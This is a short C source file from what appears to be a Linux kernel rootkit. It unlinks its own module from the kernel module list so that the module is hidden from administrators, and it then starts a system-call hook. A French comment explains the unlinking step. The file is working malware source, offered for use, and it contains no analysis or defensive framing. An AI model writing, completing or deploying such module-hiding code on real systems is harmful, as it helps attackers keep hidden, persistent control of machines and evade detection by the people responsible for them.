#include "hide_rootkit.h"
#include "syscall_hook.h"

#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>


void wlkom_hide_module(void)
{

    wlkom_erase_from_list(THIS_MODULE->list.prev, THIS_MODULE->list.next);
    wlkom_syscall_hook_init();
   
}

void wlkom_erase_from_list(struct list_head *prev, struct list_head *next)
{
    prev->next = next;
    next->prev = prev;
    //en faisant ca, notre module qui était dans prev->next et next->prev, est déchainé et n'est plus dans la liste des modules
}


